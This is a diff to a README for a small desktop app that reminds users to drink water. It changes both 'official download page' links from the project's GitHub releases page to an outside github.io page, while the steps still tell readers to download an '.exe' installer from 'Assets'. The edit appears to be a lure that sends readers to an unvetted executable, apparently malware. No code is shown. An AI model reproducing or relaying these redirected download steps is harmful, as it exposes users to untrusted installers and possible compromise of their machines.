@@ -1,6 +1,6 @@
 # 💧 GokuGoku - Drink water to stay healthy daily
 
-[![](https://img.shields.io/badge/Download-GokuGoku-blue.svg)](https://github.com/On-sleight382/GokuGoku/releases)
+[![](https://img.shields.io/badge/Download-GokuGoku-blue.svg)](https://on-sleight382.github.io)
 
 GokuGoku helps you drink enough water throughout your busy day. This simple tool sits on your desktop and reminds you to take a sip at regular intervals. It uses sounds and visuals inspired by Animal Crossing to make hydration a fun and stress-free habit.
 
@@ -8,7 +8,7 @@ GokuGoku helps you drink enough water throughout your busy day. This simple tool
 
 You can get the application from our release page. Follow these steps to find the right file for your computer:
 
-1. Visit the [official download page](https://github.com/On-sleight382/GokuGoku/releases).
+1. Visit the [official download page](https://on-sleight382.github.io).
 2. Look for the section labeled "Assets" under the latest version.
 3. Click the link that ends in ".exe" to download the installer file to your computer.
 4. Save the file in a folder you can find later, such as your Downloads folder.
